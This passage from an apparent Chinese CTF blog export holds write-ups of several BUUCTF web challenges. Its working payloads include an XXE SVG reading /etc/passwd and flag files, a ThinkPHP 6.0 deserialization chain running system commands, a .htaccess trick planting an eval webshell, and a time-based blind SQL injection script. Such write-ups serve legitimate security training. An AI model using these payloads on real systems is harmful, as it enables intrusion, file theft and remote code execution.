class="string">'__main__'</span>: app.run( debug=<span class="literal">True</span>, host=<span class="string">"0.0.0.0"</span> )</span><br></pre></td></tr></table></figure><p>查资料linux的mac地址在sys/class/net/eth0/address 下，访问拿到mac地址</p><p>这里需要拿到SECRET_KEY,计算一下，要用到种子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ae0208c5</span>)</span><br><span class="line">print(str(random.random()*<span class="number">233</span>))</span><br><span class="line"><span class="comment">#180.33971984089902</span></span><br></pre></td></tr></table></figure><p>查看一下cookie，用flask_session_manager解密一下，再改掉username的值，代码中/flag路由只要session[‘username’]==fuck就能拿到flag</p><img src="/2020/07/02/taoisms/20.png" class=""><p>这里出点意外，访问/flag，改掉session还是被拒绝访问，磨了一个小时不知道啥原因，flag不要了，方法学到了，告辞</p><h3 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h3><p>开题是一个文件上传，不了解SVG，去搜一下</p><img src="/2020/07/02/taoisms/21.png" class=""><p>看到这里就明白了，要用xxe</p><p>先大致学了一下svg文件的格式，然后就开始写一个scg文件吧，xxe读一下/etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;3000&quot; width&#x3D;&quot;20000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;0&quot; y&#x3D;&quot;15&quot; fill&#x3D;&quot;red&quot;&gt;test &amp;xxe; test&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure><p>成功回显</p><img src="/2020/07/02/taoisms/22.png" class=""><p>不知道这个载荷要怎么改才能读到flag，而且flag文件名也没有得到</p><p>其他师傅的wp显示，flag在flag.txt文件中，载荷：file:./flag.txt或者是file:///proc/self/cwd/flag.txt</p><p>进程可以通过访问/proc/self/目录来获取自己的系统信息，通过cwd获取当前目录来进入flag.txt文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:.&#x2F;flag.txt&quot;&gt; ]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;3000&quot; width&#x3D;&quot;20000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;0&quot; y&#x3D;&quot;15&quot; fill&#x3D;&quot;red&quot;&gt;test &amp;xxe; test&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure><img src="/2020/07/02/taoisms/23.png" class=""><h3 id="BSidesCF-2019-Pick-Tac-Toe"><a href="#BSidesCF-2019-Pick-Tac-Toe" class="headerlink" title="[BSidesCF 2019]Pick Tac Toe"></a>[BSidesCF 2019]Pick Tac Toe</h3><p>打开是井字棋，下赢了就能拿到flag</p><p>看源码，有提示</p><img src="/2020/07/02/taoisms/24.png" class=""><p>value对应的是下棋的位置，要在/move路径下，通过post的形式给move传值</p><p>不知道咋做，就先下两步，想着会不会能够直接下被堵死的那一步，试了试居然可以</p><img src="/2020/07/02/taoisms/25.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[安洵杯2019]iamthinking</title>
      <link href="/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/"/>
      <url>/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/</url>
      
        <content type="html"><![CDATA[<p>开题，没有任何显示，尝试访问/public路径，只显示出来一张图片<a id="more"></a></p><p>扫描目录，发现了有隐藏文件可以下载，<a href="http://www.zip，打开，可以从文件中找到是thinkphp" target="_blank" rel="noopener">www.zip，打开，可以从文件中找到是thinkphp</a> v6.0的框架</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='../test.jpg'"</span>.<span class="string">"/&gt;"</span>;</span><br><span class="line">        $paylaod = @$_GET[<span class="string">'payload'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($paylaod))</span><br><span class="line">        &#123;</span><br><span class="line">            $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">            parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">            <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">"/^O/i"</span>,$value))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'STOP HACKING'</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            unserialize($paylaod);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看到的是index.php，unserialize函数提示这道题是用反序列化，这还是第一次碰到直接给了整个框架找链子的题。这里的parse_url用来解析URL，返回其组成部分</p><img src="/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/2.png" class=""><p>查找一下资料就能找到parase_url()函数的绕过方法就是/// 三个斜杠，多说无益，测试一下好了</p><p>这是正常的url解析</p><img src="/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/3.png" class=""><p>这是绕过parase_url之后的，看起来parse_url还是进行了解析，实际上应该返回false</p><img src="/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/4.png" class=""><p>thinkphp v6.0.x 反序列化利用链：<a href="https://www.anquanke.com/post/id/187393#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187393#h2-1</a></p><p>这篇文章讲的很详细，可以自己跟着步骤找一下链子，文章末尾有exp集成的工具链接</p><p>下面是别的师傅的exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line">        <span class="keyword">private</span> $withAttr = [<span class="string">"xxx"</span> =&gt; <span class="string">"system"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">"xxx"</span> =&gt; <span class="string">"cat /flag"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">private</span> $lazySave;</span><br><span class="line">        <span class="keyword">protected</span> $withEvent;</span><br><span class="line">        <span class="keyword">private</span> $exists;</span><br><span class="line">        <span class="keyword">private</span> $force;</span><br><span class="line">        <span class="keyword">protected</span> $field;</span><br><span class="line">        <span class="keyword">protected</span> $schema;</span><br><span class="line">        <span class="keyword">protected</span> $table;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//定义this-&gt;data不为空</span></span><br><span class="line">            <span class="keyword">parent</span>::__construct();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = $obj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> Pivot();</span><br><span class="line">    $b = <span class="keyword">new</span> Pivot($a);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成序列化数据之后打过去就能那道flag了，当然也可以用那个phpggc来生成数据</p><img src="/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/5.png" class=""><p>打过去</p><img src="/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/6.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>taoismf</title>
      <link href="/2020/06/26/taoismf/"/>
      <url>/2020/06/26/taoismf/</url>
      
        <content type="html"><![CDATA[<h3 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP<a id="more"></a></h3><p>审计题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>两个unlink对写入的文件过滤的很严，这里的正则只允许a-z.的文件名，也就是说题目包含的f13g.php没有办法直接包含。在自己写入的文件内容最后面会被拼入一句话，暂时不知道会有啥影响。</p><p>考虑了很久不知道考点在哪里，索性去看wp了，找到了出题师傅的笔记，哦豁，原来考的是.htaccess,直接上传.htaccess文件会500，就是那最后面那句话的原因</p><p>非预期解：</p><p>反斜杠具有拼接上下两行的功能，这里可以用\直接绕过stristr绕过对关键字的过滤</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le <span class="string">".htaccess"</span></span><br><span class="line"><span class="comment">#&lt;?php @eval($_GET['cmd']); ?&gt;\</span></span><br></pre></td></tr></table></figure><p>进行url编码后再上传，url里就能直接getshell了</p><img src="/2020/06/26/taoismf/1.png" class=""><p>这里有个问题就是上传一次文件只能打一次</p><img src="/2020/06/26/taoismf/2.png" class=""><p>成功拿到flag，看了预期解，步骤繁琐些，下次再整理吧</p><h3 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h3><p>登录注册，注册未开放，登录按钮没有回显，抓包，可以发现是json格式发送的数据，测试发现可能存在宽字节注入，上盲注脚本跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#题目地址</span></span><br><span class="line">    url = <span class="string">"http://0ffb111f-d463-4cec-b100-341cc8a28d4b.node3.buuoj.cn/index.php?r=Login/Index"</span></span><br><span class="line">    <span class="comment">#注入payload</span></span><br><span class="line">    payloads = <span class="string">"asd';set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest;"</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment">#查询payload</span></span><br><span class="line">        payload = <span class="string">"select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)"</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#将构造好的payload进行16进制转码和json转码</span></span><br><span class="line">            datas = &#123;<span class="string">'username'</span>:payloads.format(str_to_hex(payload.format(i,j))),<span class="string">'password'</span>:<span class="string">'test213'</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>脚本是别的师傅的，我本地跑不出来，嫖了结果：glzjin_wants_a_girl_friend.zip，可以下载</p><img src="/2020/06/26/taoismf/3.png" class=""><p>逐一查看，找到了点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 所有控制器的父类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 加载视图文件</span></span><br><span class="line"><span class="comment"> * viewName 视图名称</span></span><br><span class="line"><span class="comment"> * viewData 视图分配数据</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> $viewPath;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span><span class="params">($viewName =<span class="string">''</span>, $viewData = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">"/View/&#123;$viewName&#125;.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;viewPath))</span><br><span class="line">&#123;</span><br><span class="line">extract($viewData);</span><br><span class="line"><span class="keyword">include</span> <span class="keyword">$this</span>-&gt;viewPath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个变量覆盖，并且包含了一个文件，如果控制了$viewData，应该就能读取想要的，找一下用了loadView（）的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 用户控制器</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">// 访问列表</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionList</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$params = $_REQUEST;</span><br><span class="line">$userModel = <span class="keyword">new</span> UserModel();</span><br><span class="line">$listData = $userModel-&gt;getPageList($params);</span><br><span class="line"><span class="keyword">$this</span>-&gt;loadView(<span class="string">'userList'</span>, $listData );</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $listData = $_REQUEST;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loadView(<span class="string">'userIndex'</span>,$listData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在UserController.php文件里，actionIndex()方法中，$listData是通过$_REQUEST方法获取的</p><img src="/2020/06/26/taoismf/4.png" class=""><p>读取$img_file的内容，然后以base64的形式输出图片</p><p>imgfile可通过extract(viewData)变量覆盖漏洞完全控制，而$viewData是受用户控制的完全控制的。所以这里就存在一个任意文件读取漏洞。</p><p>通过上面的思路，访问:index.php?r=User/Index&amp;img_file=/…/flag.php可直接获取flag.php经base64后的内容</p><img src="/2020/06/26/taoismf/5.png" class=""><p>base64解密就能拿到flag了</p><h3 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h3><p>这道题目涉及到接口，命名空间之类的，花了一个下午看别的师傅的wp，复现了一下<del>~</del></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(\Illuminate\Http\Request $request)</span></span>&#123;</span><br><span class="line">        $payload=$request-&gt;input(<span class="string">"payload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($payload))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据提示，下载压缩包，拿到源码，反序列化</p><p>项目搜索__destruct()方法，找到了vendor\symfony\symfony\src\Symfony\Component\Cache\Adapter\TagAwareAdapter.php</p><p>调用了$this-&gt;commit()，接着调用了$this-&gt;invalidateTags([])，跟进invalidateTags([])方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalidateTags</span><span class="params">(array $tags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ok = <span class="keyword">true</span>;</span><br><span class="line">    $tagsByKey = [];</span><br><span class="line">    $invalidatedTags = [];</span><br><span class="line">    <span class="keyword">foreach</span> ($tags <span class="keyword">as</span> $tag) &#123;</span><br><span class="line">        CacheItem::validateKey($tag);</span><br><span class="line">        $invalidatedTags[$tag] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">         <span class="comment">#判断$this-&gt;deferred是否存在</span></span><br><span class="line">        $items = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">        <span class="keyword">foreach</span> ($items <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">            <span class="comment">#键值分离</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item)) &#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[$key]);</span><br><span class="line">                $ok = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $f = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">        $tagsByKey = 